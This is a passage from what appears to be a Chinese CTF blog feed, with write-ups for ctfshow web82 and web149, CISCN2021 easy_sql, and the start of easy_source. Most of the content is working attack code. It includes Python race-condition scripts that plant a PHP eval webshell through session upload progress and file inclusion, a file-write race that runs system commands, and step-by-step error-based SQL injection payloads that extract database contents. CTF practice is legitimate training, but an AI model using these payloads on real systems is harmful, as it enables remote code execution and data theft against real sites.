src="https://img-blog.csdnimg.cn/20210520131009940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>知道目录文件名为flag.php，修改一句话木马为cat flag.php,继续竞争读取flag<br><img src="https://img-blog.csdnimg.cn/20210520131709942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解题方法2：python脚本实现竞争</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://352c5d9e-8728-47e3-b3e5-7e8934e06141.node3.buuoj.cn/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>读到flag.php<br><img src="https://img-blog.csdnimg.cn/20210520223912589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改一句话木马为cat flag.php，读取flag<br><img src="https://img-blog.csdnimg.cn/20210520224545601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web82"><a href="#ctfhshow-web入门-web82" class="headerlink" title="ctfhshow [web入门]-web82"></a>ctfhshow [web入门]-web82</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过观察代码，可以看到过滤了大部分的文件包含函数，这里我们利用PHP_SESSION_UPLOAD_PROGRESS和条件竞争进行文件包含。</p><p>和上面题一样，直接一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-comment"># coding=utf-8</span><br>import io<br>import requests<br>import threading<br><br>url = <span class="hljs-string">&#x27;http://4bd1dd58-0b1c-4019-8f55-44ad4dbea031.challenge.ctf.show:8080/&#x27;</span><br>sessid = <span class="hljs-string">&#x27;Atkx&#x27;</span><br>data = &#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;<br><br><br>def write(session):<br>    <span class="hljs-keyword">while</span> True:<br>        f = io.BytesIO(b<span class="hljs-string">&#x27;a&#x27;</span> * 1024 * 50)<br>        resp = session.post(url,<br>                            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,<br>                            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;Atkx.txt&#x27;</span>, f)&#125;,<br>                            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)<br><br><br>def <span class="hljs-built_in">read</span>(session):<br>    <span class="hljs-keyword">while</span> True:<br>        resp = session.post(url+<span class="hljs-string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,<br>                            data=data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Atkx.txt&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>            <span class="hljs-built_in">print</span>(resp.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    event = threading.Event()<br>    with requests.session() as session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=write, args=(session,)).start()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(1, 30):<br>            threading.Thread(target=<span class="hljs-built_in">read</span>, args=(session,)).start()<br>    event.set()<br></code></pre></td></tr></table></figure><p>接下来修改代码读取fl0g.php<br><img src="https://img-blog.csdnimg.cn/2021052022574475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="ctfhshow-web入门-web149"><a href="#ctfhshow-web入门-web149" class="headerlink" title="ctfhshow [web入门]-web149"></a>ctfhshow [web入门]-web149</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;show&#x27;</span>]);<br><br><span class="hljs-variable">$files</span> = scandir(<span class="hljs-string">&#x27;./&#x27;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>    <span class="hljs-keyword">if</span>(is_file(<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>            unlink(<span class="hljs-variable">$file</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>使用bp不断访问并传参，然后开一个去不断访问 1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">ctf=<span class="hljs-number">1.</span>php<br>show=<span class="hljs-meta">&lt;?php</span> system(<span class="hljs-string">&#x27;tac /c*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>利用脚本实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>url = <span class="hljs-string">&quot;http://ae3929ad-8f8f-4dc5-88c9-511d15e5625d.chall.ctf.show:8080/&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        data = &#123;<br>            <span class="hljs-string">&#x27;show&#x27;</span>:<span class="hljs-string">&#x27;&lt;?php system(&quot;ls /&quot;);?&gt;&#x27;</span><br>        &#125;<br>        W_reponse = requests.post(url+<span class="hljs-string">&quot;?ctf=1.php&quot;</span>,data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>():</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        R_reponse = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br>        <span class="hljs-keyword">if</span> R_reponse.status_code != <span class="hljs-number">404</span>:<br>            print(R_reponse.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&#x27;[*]continued&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False</span><br>    event = threading.Event()<br>    <span class="hljs-comment"># 将event的标志设置为True，调用wait方法的所有线程将被唤醒；</span><br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=write).start()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>):<br>        threading.Thread(target=read).start()<br></code></pre></td></tr></table></figure><p>跑脚本，发现了ctfshow_fl0g_here.txt文件<br><img src="https://img-blog.csdnimg.cn/20210425193008262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>修改为cat /ctfshow_fl0g_here.txt继续跑脚本，即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210425193100247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;0x00-条件竞争&quot;&gt;&lt;a href=&quot;#0x00-条件竞争&quot; class=&quot;headerlink&quot; title=&quot;0x00-条件竞争&quot;&gt;&lt;/a&gt;0x00-条件竞争&lt;/h2&gt;&lt;p&gt;条件竞争漏洞是一种服务器端的漏洞，由于服务器</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="WEB" scheme="http://atkx.top/categories/CTF/WEB/"/>
    
    
    <category term="漏洞" scheme="http://atkx.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2021赛后复现</title>
    <link href="http://atkx.top/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://atkx.top/2021/05/21/CISCN2021%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-05-21T14:26:42.000Z</published>
    <updated>2021-05-28T10:30:38.571Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="esay-sql"><a href="#esay-sql" class="headerlink" title="esay_sql"></a>esay_sql</h2><p>输入单引号报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;123456&#x27;</span><span class="hljs-string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/4903b7830329ec519a9add06ecbd160d.png" alt="image-20210515182436750"><br>sqlmap跑了一下，可以使用报错注入</p><p>1.爆库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,database(),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~security~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>2.爆表名</p><p>猜测表名为flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Operand should contain 1 column(s)</span><br></code></pre></td></tr></table></figure><p>3.爆列名</p><p>过滤了information_schema函数，可以使用join 无列名注入</p><p>得到id列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag )b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到no列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>no<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>得到ea1235fa-d397-474b-8188-dedbe352ffc7列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select * from (select * from flag join flag as a using(id,no))b),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Duplicate column name &#x27;</span>ea1235fa-d397<span class="hljs-number">-474</span>b<span class="hljs-number">-8188</span>-dedbe352ffc7<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>4.爆值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,(select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-s<br></code></pre></td></tr></table></figure><p>因为报错注入限制只能读取一半flag，用right读取右半部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">uname=admin&amp;passwd=<span class="hljs-number">123456</span><span class="hljs-string">&#x27;)and extractvalue(1,concat(0x7e,right((select `ea1235fa-d397-474b-8188-dedbe352ffc7` from flag),20),0x7e))--+&amp;Submit=%E7%99%BB%E5%BD%95</span><br><span class="hljs-string"></span><br><span class="hljs-string">#XPATH syntax error: &#x27;</span>~-qiG07-oHt4u-shqSb-&#125;~<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/img_convert/b33f074e5d8a9425d7463e89e4510ba4.png" alt="image-20210515184620854"><br>消去重复部分，最终flag为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">CISCN&#123;tJ1mc-jgoXW-qiG07-oHt4u-shqSb-&#125;<br></code></pre></td></tr></table></figure><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>一道原题，参考<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">wp</a>复现的<br>题目描述：你知道开发一个php程序很重要的东西是什么吗（flag在你看不到的地方）</p><p>最重要的就是备份，访问.index.php.swo得到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs php">本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">c</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">d</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">g</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">h</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">i</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">j</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">k</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">l</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span class="hljs-built_in">self</span>::<span class="hljs-variable">$c</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">m</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> ++<span 